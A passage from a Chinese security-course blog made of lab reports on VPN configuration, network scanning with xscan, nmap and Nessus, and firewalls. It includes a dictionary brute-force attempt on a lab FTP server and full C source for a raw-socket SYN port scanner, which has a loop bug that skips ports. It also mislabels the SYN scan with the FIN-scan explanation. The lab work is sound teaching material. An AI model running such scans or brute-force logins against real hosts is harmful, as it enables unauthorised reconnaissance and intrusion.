SA交换，协商确认有关安全策略。该过程进行安全协商 密钥交换阶段，主要交换密钥Diffie-Hellman公共值。数据包中的Key Exchange用于交换各自加密生成的主密钥；Nonce使用了随机数，防止重放攻击；加密所用的密钥为ipsec中设定的预共享密钥； NAT-D为双方的ip+端口的Hash值。 ID信息和认证数据交换，进行身份认证，对第一阶段交换内容的认证。 IPSec SA建立分为两个阶段，都是加密数据，无法查看。用到了Quick-Mode，目的是在两个对等体间协商一组一致的参数来创建IPSec SA，用于真实数据的加解密，并且在此进行PFS，PFS及在Quick-Mode重新做DH的交换，产生新的密钥用于IPSec数据的加密。 2.3.5 思考 Q：IKE密钥协商过程是否存在安全威胁？ A：IPSec密钥交换过程分为两个独立阶段。第一阶段通信双方彼此建立一个通过身份认证和安全保护的隧道，称为ISAKMP SA。只要ISAKMP SA建立起来，所有发起方和应答方之间的IKE通信信息都通过加密、完整性检查和认证的方法受到保护。第二阶段的建立是为特定的Internet安全协议(如IPSec等)创建安全关联(IPSec SA)。IKE第一阶段的目的是建立一个安全隧道，使得第二阶段的协商可以秘密地进行。两台主机之间可以同时建立多个ISAKMP SA，一个ISAKMP SA也可以创建多个IPSec SA，ISAKMP SA的结束不会影响它创建的IPSec SA发生作用。这种密钥协商过程是存在着漏洞的，可以通过中间人攻击和拒绝服务攻击实现漏洞利用。 0x03 配置OPENVPN 4.1 网络环境 服务器端 Windows xp: 192.168.195.131 client IP :192.168.195.131 4.2 环境修改 把 easy-rsa 目录下的 vars.bat.sample 改名为 vars.bat，并且修改其内容\n把 easy-rsa 下的 openssl.cnf.sample 改成 openssl.cnf。\n然后进入 cmd.exe\n生成 Root CA\n格式: build-ca.bat\n输出: keys/ca.crt keys/ca.key\n生成 dh1024.pem 文件，Server 使用 TLS 必须使用的一个文件。\n格式: build-dh.bat\n输出: keys/dh1024.pem\n下面生成服务端证书、客户端证书和 TA 证书：\n下面开始生成 Server 使用的证书了：\n格式: build-key-server.bat 输出: keys/.crt .csr .key\n下面开始为 client 办法证书：\n格式: build-key.bat 输出: keys/.crt keys/.csr keys/.key\n下面生成 ta.key 文件\n格式: openvpn \u0026ndash;genkey \u0026ndash;secret keys/ta.key\n输出: keys/ta.key\n服务端与客户端的配置:\nserver.opvn配置 把 easy-rsa\\keys\\下的 ca.crt server.crt server.key ta.key dh1024.pem复制到 server.ovpn 所在目录。 可以看到server端连接：VPN的IP为10.8.0.0 Client\nclient.opvn配置 服务端主机 easy-rsa/keys 下的 ca.crt client.crt client.key ta.key 一起放到客户机的\u0026lt;OPENVPN_HOME\u0026gt;\\config 目录下。 连接效果图 4.3 连接测试 0x04 PacketTrace VPN配置 5.1 实验环境 系统：Windows xp 软件工具：思科官方模拟器Packet Tracer 5.3 模拟实体：2台cisco2800系列路由器、2台24端口以太网交换机和若干PC电脑 5.2 初始化路由器 安装Packet Tracer 5.3\n配置安全策略\n新建一条安全策略PacketTracer，添加IP安全规则，隧道方式为不指定隧道，网络类型选择所有网络连接，身份验证方法选择用字符串保护密钥交换，输入：123456；进入IP筛选器列表的配置项，设置一个新的IP筛选器列表，新建一个IP筛选器，将我的IP地址作为源地址，将任何IP地址作为目标地址，在选择协议类型中选中任意，新建一个筛选操作，设置为协商安全，选中不和不支持IPSec的计算机通讯，以要求必须在IPSec基础上进行连接，IP通讯安全设施中选择选择自定义，然后点击设置选择如下图，选择默认直至配置完成 初始化配置路由器\n打开cisco模拟器，在模拟器窗口工具栏下选择file--new。在左下角设备栏选取路由器。 将cisco2811路由器拖到工作区域，单击工作区域的路由器图标，选择CLI项，弹出如图所示界面 进入路由器特权模式配置路由器网卡IP，输入命令如下\n1 2 3 4 5 6 7 8 9 10 11 Router\u0026gt;enable\t//进入特权模式，只有在特权模式下才可以对路由器进行配置 Router#configure terminal\t//进入配置状态，通过端口进行配置 Router(config)# interface fastEthernet 0/0\t//进入端口f0/0 Router(config-if)#ip address 10.0.0.1 255.255.255.0\t#配置网卡f0/0的ip地址和子网掩码 Router(config-if)#no shutdown\t//开启端口f0/0 Router(config-if)#end\t//返回特权模式 Router#configure terminal\t//进入配置状态，通过端口进行配置 Router(config)# interface fastEthernet 0/1 //进入端口f0/1 Router(config-if)#ip address 192.168.1.1 255.255.255.0 //配置网卡f0/1的ip地址和子网掩码 Router(config-if)#no shutdown\t//开启端口f0/1 Router(config-if)#end\t//返回特权模式 初始配置router 0完成，根据router 0的配置过程完成router 1的配置，其中router 1的f0/0端口IP为10.0.0.2/24, router 1的f0/1端口的IP地址为192.168.2.1/24\n配置完成后，点击选择将router 0和router 1的f0/0端口连接\n5.3 搭建网络环境 在模拟器左下角选择PC\n拖到绘图工作区，双击PC图标，选择Desktop，如图所示 选择IP Configuration，配置PC的IP地址和子网掩码，如图所示\n重复上述操作，配置六台PC，它们的IP地址分别为\n192.168.1.10 192.168.1.20 192.168.1.30 192.168.2.10 192.168.2.20 192.168.2.30 子网掩码全为255.255.255.0，前三台网关为192.168.1.1，后三台网关为192.168.2.1\n选取交换机\n将路由器于交换机相连，将交换机于PC相连；最终完成如图所示的网络图 5.4 配置路由 在路由器中配置路由，使路由器两端的网络互通\n配置router 0，双击router 0图标，选择CLI项，进入路由器配置窗口，输入命令如下\n1 2 3 4 5 Router\u0026gt;en Router#configure terminal Router(config)# ip route 0.0.0.0 0.0.0.0 fastEthernet 0/0 //配置内网访问外部网络的出口路由 Router(config)#ip route 192.168.1.0 255.255.255.0 fastEthernet 0/1 //配置外部访问内部网络入口路由 Router(config)#end 配置router 1，双击router 1图标，选择CLI项，进入路由器配置窗口，输入命令如下\n1 2 3 4 5 Router\u0026gt;en Router#configure terminal Router(config)# ip route 0.0.0.0 0.0.0.0 fastEthernet 0/0 //配置内网访问外部网络的出口路由 Router(config)#ip route 192.168.2.0 255.255.255.0 fastEthernet 0/1 //配置外部访问内部网络入口路由 Router(config)#end 5.5 测试网络互通性 双击PC0图标，在弹出的对话框中，选择Desktop，选择Command Prompt\n使用ping命令，ping 192.168.1.1、10.0.0.1、192.168.2.10、10.0.0.2、192.168.3.10结果除了最后一个地址(该地址不存在)其它全能ping通，表明搭建的网络满足实验环境\n0x05 IPSEC隧道模式VPN 5.1 配置IPSec VPN 配置router 0，双击router 0图标，选择CLI项，进入路由器配置窗口\n定义IKE的策略(router 0和router1之间的密钥交换策略)，IKE只是密钥的交换策略,在使用加密对称和非对称加密算法的时候,需要密钥来对数据加密,下面的IKE策略只是建立一条管理连接，负责加密生成的各种密钥，输入命令如下\n1 2 3 4 5 6 7 8 9 Router#configure terminal\t//进入配置状态，通过端口进行配置 Router (config)#crypto isakmp policy 10\t//一个IKE的策略，号码是10，数字越低，策略优先级越高 Router (config-isakmp)# authentication pre-share\t//使用预定义共享密钥进行设备认证 Router (config-isakmp)#hash md5\t//认证方式使用MD5进行认证 Router (config-isakmp)#encryption des\t//加密方式使用DES，可选AES/DES Router (config-isakmp)#group 2\t//指定DH组 Router (config-isakmp)# lifetime 86400\t//对生成新SA的周期进行调整，两端的路由器都要设置相同的SA周期 Router (config-isakmp)# exit Router (config)#crypto isakmp key reus09 address 10.0.0.2 //定义一个密码,密码是reus09，和地址为10.0.0.2的设备去交换密钥 定义数据的加密方式和认证方式，配置IPSec，输入命令如下\n1 2 3 4 5 6 7 8 Router (config)#access-list 110 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255\t//定义访问控制列表,这里的访问控制列表不是对数据进行过滤，是定义那些数据应该被加密，也可以理解哪些数据触发IPSec 流 Router (config)#crypto ipsec transform-set mine esp-des esp-md5-hmac\t//设置数据的加密方式，策略名字为mine，使用ESP-DES对数据加密，ESP-MD5-HMAC对数据认证 Router(config)# crypto map mymap 101 ipsec-isakmp //定义一个map,调用刚才做的策略 Router(config-crypto-map)# match address 110\t//匹配出访问控制列表110的数据 Router(config-crypto-map)# set peer 10.0.0.2 //标识对端路由器的合法IP地址 Router(config-crypto-map)# set pfs group2 Router(config-crypto-map)# set transform-set mine //使用刚才定义好的策略对数据加密 Router(config-crypto-map)# set security-association lifetime seconds 86400\t//指定IPSec SA的存活期 将map映射到公网端口，一个端口只能映射一个map，输入命令如下\n1 2 3 4 Router（config）interface fastEthernet 0/0 Router(config-if)#crypto map mymap *Jan 3 07:16:26.785: %CRYPTO-6-ISAKMP_ON_OFF: ISAKMP is ON Router（config-if）end 查看策略\n查看IKE策略\n1 Router# show crypto isakmp policy 查看IPSec变换集\n1 Router# show crypto ipsec transform-set 查看 crypto maps\n1 Router# show crypto map 配置router 1，双击router 1图标，选择CLI项，进入路由器配置窗口\n定义IKE的策略，与配置route 0相同 定义数据的加密方式和认证方式，配置IPSec，与配置route 0相同 将map映射到公网端口，与配置route 0相同 5.2 测试IPSec VPN 测试VPN连通性\n双击PC0图标，在弹出的对话框中，选择Desktop，选择Command Prompt，ping 192.168.2.10，如下图所示\n验证数据经过IPSec VPN 加密传输，点击进入simulation mode，弹出如图所示对话框\n重复上一步操作，simulation Panel中选取Auto Capture，观察工作区动画，展示了数据包在网络中的传送过程\n双击路由器router 0处数据包，弹出如图所示弹框，可以分析出数据包的信息\n进入路由器的数据包（左侧）的信息源IP是192.168.1.10，目的IP是192.168.2.10 路由器出去的数据包(右侧)的源IP改变为10.0.0.1，目的IP变为10.0.0.2 从上图的第六条信息中发现ESP encrypts the received packet的信息 综上，从PC0（192.168.1.10）发往对端PC3（192.168.2.10）的数据经过了路由器的IPSec VPN模块加密处理，隐藏了内网的IP地址信息，从而保护了内网的数据 断开VPN\n断开router 0\n1 2 3 Router（config）#interface fastEthernet 0/0 Router(config-if)#no crypto map mymap Router（config-if）end 双击PC0图标，在弹出的对话框中，选择Desktop，选择Command Prompt，ping 192.168.2.10，ping不通，表明只断开一端路由器的端口map映射，两边无法连通\n以同样的方式断开route 1\n1 2 3 Router（config）#interface fastEthernet 0/0 Router(config-if)#no crypto map mymap Router（config-if）end 双击PC0图标，在弹出的对话框中，选择Desktop，选择Command Prompt，ping 192.168.2.10，ping成功，表明两端都断开后，两边网络可以再次保持连接\n抓取经过route 0的数据包，发现数据不再加密传输。\n0x06 总结 通过配置IPSEC，明白AH和ESP的区别。 配置OPEN VPN,PacketTrace 对局域网的架构有了一定的了解。 配置多个VPN，明白了VPN的工作原理。 ","permalink":"http://www.reus09.top/posts/tech/vpn%E9%85%8D%E7%BD%AE/","summary":"VPN配置实验 0x01 实验内容 在Windows IPSEC配置实验中，通过抓包工具抓取IKE SA和IPSEC SA建立过程的数据包，并进行分析；思考：","title":"Vpn配置"},{"content":"网络扫描 0x01 实验目的 用xscan、nmap和nessus软件进行主机、端口、漏洞扫描实验，捕获扫描时交互的数据包，通过分析扫描数据包，验证扫描原理。 找到一种常见的主机系统或应用程序漏洞，研究该漏洞的扫描原理，对该漏洞进行扫描器扫描实验，通过分析捕获的扫描数据包验证漏洞扫描原理。(选做) 编程实现TCP全连接或半连接的端口扫描。（选做） 0x02 实验前提知识 网络扫描器的主要功能\n扫描目标主机识别其工作状态（开/关机） 识别目标主机端口的状态（监听/关闭） 识别目标主机系统及服务程序的类型和版本 根据已知漏洞信息，分析系统脆弱点 生成扫描结果报告 扫描器的基本工作原理\n网络扫描技术\n主机扫描技术\n主机扫描的目的是确定在目标网络上的主机是否可达。这是信息收集的初级阶段，其效果直接影响到后续的扫描。 传统扫描手段 ICMP Echo扫描 ICMP Sweep扫描 Broadcast ICMP扫描 Non-Echo ICMP扫描 防火墙和网络过滤设备常常导致传统的探测手段变得无效。为了突破这种限制，必须采用一些非常规的手段，利用ICMP协议提供网络间传送错误信息的手段，往往可以更有效的达到目的： 异常的IP包头 在IP头中设置无效的字段值 错误的数据分片 通过超长包探测内部路由器 反向映射探测 端口扫描技术\n确定目标主机可达后，使用端口扫描技术，发现目标主机的开放端口，包括网络协议和各种应用监听的端口。\n开放扫描 会产生大量的审计数据，容易被对方发现，但其可靠性高\nTCP Connect 扫描 TCP反向ident扫描 隐蔽扫描\n能有效的避免对方入侵检测系统和防火墙的检测，但这种扫描使用的数据包在通过网络时容易被丢弃从而产生错误的探测信息\nTCP FIN 扫描 TCP Xmas扫描 TCP Null 扫描 TCP ftp proxy扫描 分段扫描 半开放扫描\n隐蔽性和可靠性介于前两者之间。\nTCP SYN 扫描 TCP间接扫描 UDP端口扫描\n栈指纹OS识别技术\n根据各个OS在TCP/IP协议栈实现上的不同特点，采用黑盒测试方法，通过研究其对各种探测的响应形成识别指纹，进而识别目标主机运行的操作系统 被动扫描 通过Sniffer收集数据包，再对数据包的不同特征（TCP Window\u0002size、 IP TTL、IP TOS、DF位等参数）进行分析，来识别操作系统。 主动扫描 采用向目标系统发送构造的特殊包并监控其应答的方式来识别操作系统类型。 漏洞扫描技术\n在端口扫描后得知目标主机开启的端口以及端口上的网络服务，将这些相关信息与网络漏洞扫描系统提供的漏洞库进行匹配，查看是否有满足匹配条件的漏洞存在。 通过模拟黑客的攻击手法，对目标主机系统进行攻击性的安全漏洞扫描，如测试弱势口令等。若模拟攻击成功，则表明目标主机系统存在安全漏洞。 CGI漏洞扫描、POP3漏洞扫描、FTP漏洞扫描、SSH漏洞扫描、HTTP漏洞扫描等。这些漏洞扫描是基于漏洞库，将扫描结果与漏洞库相关数据匹配比较得到漏洞信息。 Unicode遍历目录漏洞探测、FTP 弱密码探测、OPENRelay邮件转发漏洞探测等，这些扫描通过使用插件（功能模块技术）进行模拟攻击，测试出目标主机的漏洞信息。 0x03 实验环境 Winodows xp 汇编 IP:192.168.195.135 MAC: 00-0c-29-19-ba-6e Winodows xp 网络安全实验 IP:192.168.195.131 MAC:00-0c-29-06-65-c9 Windows 7 IP:192.168.195.145 MAC:00-0c-29-f1-b5-17 程序运行机器 Ubuntu 16 网关 IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 工具 xscan nmap nessus wireshark 0x04 软件扫描 xscan xscan 配置 参数\n开始扫描\n扫描结果 Wireshark抓包分析\n首先应该是 SYN半扫描端口是否开放\n源IP(192.168.195.131)随机端口发送tcp-syn连接给目的IP(1921.68.195.135)\n因为扫描了1024个端口，这里只放第一个和最后一个端口的截图\nSYN扫描实现原理：扫描器向目标主机端口发送SYN包。如果应答是RST包，那么说明端口是关闭的；如果应答中包含SYN和ACK包，说明目标端口处于监听状态，再传送一个RST包给目标机从而停止建立连接。\n可以看到大量的tcp-syn请求，返回的均为RST,标明该端口没有开放\n如果返回为SYN+ACK,则表明端口开放\nTCP Connect 扫描\n实现原理：通过调用socket函数connect()连接到目标计算机上，完成一次完整的三次握手过程。如果端口处于侦听状态，那么connect()就能成功返回。否则，这个端口不可用，即没有提供服务。 通过三次握手，查看端口是否开放，并进行一定的使用 ftps ssh http https sslv2协议试探\nUDP端口扫描\n向目标端口发送UDP 包。如果得到的应答为“ICMP port Unreachable”（ICMP 端口不可到达），那么目标端口是关闭的。 反之，如果没有收到这个应答消息，则目标端口极有可能是开放的。 结合报告，xscan主要对netbios-ssn(139/tcp)、https (443/tcp)、FTP-ssl (990/tcp)、ssh (22/tcp)、www (443/tcp)、ftp (990/tcp)、microsoft-ds (445/tcp)、ftp (21/tcp)、epmap (135/tcp)、www (80/tcp)、netbios-ns (137/udp)、ntp (123/udp)\nnmap 参数设置\n首先开启的为 TCP SYN扫描\nTCP - SYN扫描\n扫描器向目标主机端口发送FIN包。当一个FIN数据包到达一个关闭的端口，数据包会被丢掉，并且返回一个RST数据包。否则，若是打开的端口，数据包只是简单的丢掉（不返回RST）。 Wireshark抓包\n、 发现无效，因为TCP SYN扫描通常适用于UNIX目标主机，但在Windows95/NT环境下，该方法无效。因为不论目标端口是否打开，操作系统都返回RST包。我们这里的目标主机是xp系统，所以无论什么端口都会回显RST包 开启 TCP ACK 扫描\nTCP-ACK扫描 TCP ACK扫描是利用标志位ACK，而ACK标志在TCP协议中表示确认序号有效，它表示确认一个正常的TCP连接。但是在TCP ACK扫描中没有进行正常的TCP连接过程，实际上是没有真正的TCP连接。那么当发送一个带有ACK标志的TCP报文到目标主机的端口时，目标主机会怎样反应呢？ 使用TCP ACK扫描不能够确定端口的关闭或者开放，因为当发送给对方一个含有ACK表示的TCP报文的时候，都返回含有RST标志的报文，无论端口是开放或者关闭。所以，不能使用TCP ACK扫描来确定端口是否开放或者关闭。但是可以利用它来扫描防火墙的配置，用它来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的 Wireshark抓包 可以看到源主机发送的TCP请求包中，ACK直接被初始化了，没有了SYN过程 开启TCP - Xmas 扫描\nTCP - Xmas 扫描 TCP Xmas和Null扫描是FIN扫描的两个变种。Xmas扫描打开FIN，URG和PUSH标记，而Null扫描关闭所有标记。 这些组合的目的是为了通过对FIN标记数据包的过滤。 当此类数据包到达一个关闭的端口，数据包会被丢掉，并且返回一个RST数据包。否则，若是打开的端口，数据包只是简单的丢掉（不返回RST）。 Wireshak 抓包 可以看到发的源IP包里面带有Urgent、Fin、Push字段 TCP - Connect 扫描\n通过调用socket函数connect()连接到目标计算机上，完成一次完整的三次握手过程。如果端口处于侦听状态，那么connect()就能成功返回。否则，这个端口不可用，即没有提供服务\nWireshark 抓包\n可以看到我们开放的http端口经过TCP三次连接可以连接，而另一个端口无法连接，返回一个RST包\n开启 TCP NULL 扫描\nTCP NULL 扫描 TCP Xmas和Null扫描是FIN扫描的两个变种。而Null扫描关闭所有标记。这些组合的目的是为了通过对FIN标记数据包的过滤。当此类数据包到达一个关闭的端口，数据包会被丢掉，并且返回一个RST数据包。否则，若是打开的端口，数据包只是简单的丢掉（不返回RST）。 可以看到我们开放的端口都没有回显，关闭的端口都返回一个RST、ACK包 开启 TCP 滑动窗口扫描\n其实就是大量的TCP ACK扫描\n根据抓包，发现其即为通过同时发送大量的ACK包，这里是TCP ACK扫描\n同时大量返回对上述包的RST包来查看端口是否开放。\nTCP FIN 扫描\nTCP FIN 扫描 扫描器向目标主机端口发送FIN包。当一个FIN数据包到达一个关闭的端口，数据包会被丢掉，并且返回一个RST数据包。否则，若是打开的端口，数据包只是简单的丢掉（不返回RST）。 Wireshark分析 通过将请求包置为FIN查看端口是否开放。 nmap报告\nnessus 因为Window xp里面的 nessus版本用不了\n所以在虚拟机Windows 7 里面搭建新版的 Nessus 8\n并且对靶机192.168.195.135进行攻击\n利用Wireshark进行抓包分析数据流。\nTCP-SYN扫描\n这里仅以HTTP为例子。(其他的协议就不赘述了)\n80端口开放，所以SYN请求之后，可以正常回显，反之，如果请求的端口81.82没有开放，则回显一个RST包\nTCP - Connect 扫描\n可以看到 交互过程先 实现三次握手。查看了HTTPS、HTTP、TLSV1、ssh、FTP协议 SSLV2 协议是否支持\nSSLv3 协议是否支持\nnessus 扫描192.168.195.135 得到的漏洞报告\n0x05 找到漏洞 FTP弱口令漏洞扫描： 扫描原理： 在上述实验过程中，发现靶机开启了21(默认端口)，那么我们可以用字典里的账户和密码去试着登录，如果能够登陆上去，则存在漏洞 利用S-scan进行扫描模块 选择扫描模块，扫描端口 扫描结束 生成的报告 用Wireshark 对过程进行分析 首先，攻击机利用随机端口向靶机的FTP端口发出TCP SYN连接请求 然后，靶机端给其回复一个ACK,此时可以监听到21端口 最后，攻击机收到靶机的ack，再回复一个ack,至此三次握手完成 之后，攻击机就开始用字典里面的数据来 不断发送数据包来暴力破解 靶机的FTP服务器密码账户 之后的过程，攻击机一直再重复以上过程，但可能因为FTP账户和密码设置的较为复杂，以及攻击机的字典过于弱小，所以不能够暴力登入ftp服务器中 0x06 编程实现 这里实现的是TCP SYN 扫描(即半连接扫描)\n这里用套接字socket的方法来实现tcp SYN 扫描\n来实现查看靶机端口的开放情况，便于方便，这里端口即从1~1024为止。 只需要构造好一个TCP包，指定好包中IP.flags=0x02(为SYN包)。\n我们这里在ubuntu 16 的环境中编译我们写好的程序\n执行程序\n与此同时，利用Wireshark在靶机进行抓包\n可以很明显的看到攻击机的随机端口向靶机的端口从1-1024发送SYN请求，端口存在返回ACK包，端口不存在返回RST包。 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; struct pseudohdr { unsigned int saddr; unsigned int daddr; char zeros; char protocol; unsigned short length; }; unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } int make_syn_packet(char *packet, int pkt_len, unsigned int daddr,unsigned int saddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 //saddr = inet_addr(\u0026#34;192.168.195.145\u0026#34;); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } return fd; } int send_syn_packet(int i ,int sockfd, unsigned int addr, unsigned int sddr,unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d 端口已经探测\\n\u0026#34;,i); pkt_len = make_syn_packet(packet, 256, addr,sddr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } int main(int argc, char *argv[]) { unsigned int addr; unsigned int sddr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } addr = inet_addr(argv[1]); sddr = inet_addr(argv[2]); sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } for (int i = 0 ; i \u0026lt;= 1024; i++) { port = i; if (send_syn_packet(i,sockfd, addr,sddr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } i +=1; } close(sockfd); return 0; } 0x07 总结 明晓网络扫描器xscan、nmap、nessus网络扫描过程中用到的扫描方法。 网络扫描三个过程 主机扫描 端口扫描 漏洞分析 明白了TCP SYN、ACK、FIN、NULL、Xmac、Connect 等扫描方法的原理。 通过Xscan扫描靶机的FTP,通过Wireshark抓包分析扫描器利用FTP弱口令漏洞的过程。 通过编程socket 实现 TCP SYN 扫描，进一步加深了对socket编程的理解。 ","permalink":"http://www.reus09.top/posts/tech/%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F/","summary":"网络扫描 0x01 实验目的 用xscan、nmap和nessus软件进行主机、端口、漏洞扫描实验，捕获扫描时交互的数据包，通过分析扫描数据包，验证扫描","title":"网络扫描"},{"content":"防火墙实验 0x01 实验目标 选择一种主流的软件防火墙，熟悉其安全规则配置，通过配置防火墙规则，实现以下功能：\n过滤远程服务器（R）到本地主机（L）的TCP数据。 过滤R-\u0026gt;L中数据包源端口为21或80的数据，查看现象。 能够由本机登录ftp服务器成功（通过用户名、密码验证） 阻止将ftp内容列表、上传、下载数据。 配置linux系统下iptables防火墙；在linux系统下，配置iptables防火墙，实现如下功能：\nIptables防火墙的启动停止。 Iptables防火墙规则查看、添加、删除。 设置Iptables防火墙的包过滤规则，实现以下功能： 禁止所有进出本地主机的数据包通过；（通过Ping验证） 允许某特定IP主机远程ping本地主机； 允许某特定IP主机远程telnet或putty本地主机。 选做：完成下述功能：\n由本机登录ftp服务器成功（通过用户名、密码验证）； 无法将ftp内容列表或上传、下载数据； 0x02 实验前提 实验前提知识\n防火墙定义：\n防火墙是位于两个（或多个）网络间，实施网间访问控制的一组组件的集合。 防火墙是指隔离在内部网络和外部网络之间的一道防御系统，是这一类防范措施的总称。 防火墙设计目标：\n内部和外部之间的所有网络数据流必须经过防火墙。 只有符合安全策略的数据流，即，经过授权的数据流才能通过防火墙。 防火墙自身不能被攻破。 防火墙经典部署\n防火墙功能模块\n防火墙类型\n包过滤防火墙 包过滤防火墙用规则检测每个IP包，根据结果放行或丢弃这些数据包。 包过滤防火墙一般会配置为双向过滤，即针对进入内部网络和离开内部网络两个方向的数据进行过滤。 过滤规则基于数据包中的信息，例如： 源、目IP地址， 源、目端口，例如：FTP(21)、 HTTP(80) 、DNS(53)… 协议类型，例如：TCP、 UDP、 ICMP 、IGMP… 状态检查防火墙 过滤规则基于数据包中的信息，例如： 网络接口，例如：eth0用于入站，eth1用于出站… IP选项，例如：源路由、记录路由… TCP选项，例如：SYN 、ACK、 FIN 、RST… 数据包流向，例如：入站（in）或出站（out） 电路级代理防火墙 是一个通用代理服务器，它工作于OSI互联模型的会话层或是TCP/IP协议的TCP层。 它适用于多个协议，但它不能识别在同一个协议栈上运行的不同的应用，当然也就不需要对不同的应用设置不同的代理模块，但这种代理需要对客户端作适当修改。 它接受客户端的连接请求，代理客户端完成网络连接，建立起一个回路，对数据包起转发作用，数据包被提交给用户的应用层来处理。 通过电路级网关传递的数据似乎起源于防火墙，隐藏了被保护网络的信息。 应用层代理防火墙 